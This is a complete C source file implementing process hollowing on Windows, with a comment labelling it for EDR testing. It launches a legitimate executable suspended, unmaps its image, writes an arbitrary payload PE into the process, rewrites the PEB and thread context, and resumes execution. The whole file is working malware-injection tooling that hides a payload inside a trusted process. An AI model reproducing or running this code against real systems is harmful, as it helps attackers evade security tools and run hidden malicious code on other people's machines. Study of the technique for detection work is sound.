/*
 * Process Hollowing (Process Replacement)
 * 
 * This technique creates a legitimate process in suspended state,
 * unmaps its memory, and replaces it with malicious code:
 * 1. Create target process in suspended state
 * 2. Unmap the original executable from memory
 * 3. Allocate new memory in the process
 * 4. Write payload to the allocated memory
 * 5. Update process context to point to new code
 * 6. Resume the thread
 * 
 * For EDR testing purposes only.
 */

#include <windows.h>
#include <stdio.h>

typedef LONG (NTAPI *NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target_executable> <payload_executable>\n", argv[0]);
        printf("Example: %s C:\\\\Windows\\\\System32\\\\notepad.exe C:\\\\payload.exe\n", argv[0]);
        return 1;
    }
    
    const char* targetPath = argv[1];
    const char* payloadPath = argv[2];
    
    printf("[*] Process Hollowing Technique\n");
    printf("[*] Target: %s\n", targetPath);
    printf("[*] Payload: %s\n", payloadPath);
    
    // Step 1: Read payload file
    HANDLE hPayloadFile = CreateFileA(
        payloadPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hPayloadFile == INVALID_HANDLE_VALUE) {
        printf("[!] Error: Failed to open payload file. Error: %d\n", GetLastError());
        return 1;
    }
    
    DWORD payloadSize = GetFileSize(hPayloadFile, NULL);
    BYTE* pPayload = (BYTE*)malloc(payloadSize);
    
    DWORD bytesRead;
    if (!ReadFile(hPayloadFile, pPayload, payloadSize, &bytesRead, NULL)) {
        printf("[!] Error: Failed to read payload file\n");
        CloseHandle(hPayloadFile);
        free(pPayload);
        return 1;
    }
    CloseHandle(hPayloadFile);
    printf("[+] Payload loaded (%d bytes)\n", payloadSize);
    
    // Validate PE format
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pPayload;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Error: Invalid DOS signature\n");
        free(pPayload);
        return 1;
    }
    
    IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)(pPayload + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Error: Invalid NT signature\n");
        free(pPayload);
        return 1;
    }
    printf("[+] Valid PE file detected\n");
    
    // Step 2: Create target process in suspended state
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (!CreateProcessA(
        targetPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[!] Error: Failed to create process. Error: %d\n", GetLastError());
        free(pPayload);
        return 1;
    }
    printf("[+] Target process created (PID: %d) in suspended state\n", pi.dwProcessId);
    
    // Step 3: Get context of main thread
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[!] Error: Failed to get thread context. Error: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(pPayload);
        return 1;
    }
    printf("[+] Thread context retrieved\n");
    
    // Step 4: Get PEB address (Process Environment Block)
    #ifdef _WIN64
        PVOID pPeb = (PVOID)ctx.Rdx;
        PVOID pImageBase = (PVOID)((PBYTE)pPeb + 0x10);
    #else
        PVOID pPeb = (PVOID)ctx.Ebx;
        PVOID pImageBase = (PVOID)((PBYTE)pPeb + 0x8);
    #endif
    
    PVOID baseAddress;
    SIZE_T bytesRead2;
    if (!ReadProcessMemory(pi.hProcess, pImageBase, &baseAddress, sizeof(PVOID), &bytesRead2)) {
        printf("[!] Error: Failed to read image base. Error: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(pPayload);
        return 1;
    }
    printf("[+] Original image base: 0x%p\n", baseAddress);
    
    // Step 5: Unmap original executable
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtUnmapViewOfSection pNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    if (pNtUnmapViewOfSection) {
        pNtUnmapViewOfSection(pi.hProcess, baseAddress);
        printf("[+] Original image unmapped\n");
    }
    
    // Step 6: Allocate memory for payload
    PVOID pRemoteImage = VirtualAllocEx(
        pi.hProcess,
        (PVOID)pNtHeaders->OptionalHeader.ImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (pRemoteImage == NULL) {
        printf("[!] Error: Failed to allocate memory. Error: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(pPayload);
        return 1;
    }
    printf("[+] Memory allocated at: 0x%p (%d bytes)\n", pRemoteImage, pNtHeaders->OptionalHeader.SizeOfImage);
    
    // Step 7: Write PE headers
    if (!WriteProcessMemory(pi.hProcess, pRemoteImage, pPayload, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("[!] Error: Failed to write headers\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(pPayload);
        return 1;
    }
    printf("[+] PE headers written\n");
    
    // Step 8: Write sections
    IMAGE_SECTION_HEADER* pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(
            pi.hProcess,
            (PVOID)((LPBYTE)pRemoteImage + pSectionHeader[i].VirtualAddress),
            (PVOID)((LPBYTE)pPayload + pSectionHeader[i].PointerToRawData),
            pSectionHeader[i].SizeOfRawData,
            NULL
        )) {
            printf("[!] Error: Failed to write section %s\n", pSectionHeader[i].Name);
        } else {
            printf("[+] Section %s written\n", pSectionHeader[i].Name);
        }
    }
    
    // Step 9: Update PEB with new image base
    if (!WriteProcessMemory(pi.hProcess, pImageBase, &pRemoteImage, sizeof(PVOID), NULL)) {
        printf("[!] Error: Failed to update image base\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(pPayload);
        return 1;
    }
    printf("[+] PEB updated with new image base\n");
    
    // Step 10: Update entry point
    #ifdef _WIN64
        ctx.Rcx = (DWORD64)((LPBYTE)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    #else
        ctx.Eax = (DWORD)((LPBYTE)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    #endif
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[!] Error: Failed to set thread context. Error: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(pPayload);
        return 1;
    }
    printf("[+] Entry point updated\n");
    
    // Step 11: Resume thread
    ResumeThread(pi.hThread);
    printf("[+] Thread resumed - Process hollowing completed\n");
    
    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(pPayload);
    
    return 0;
}
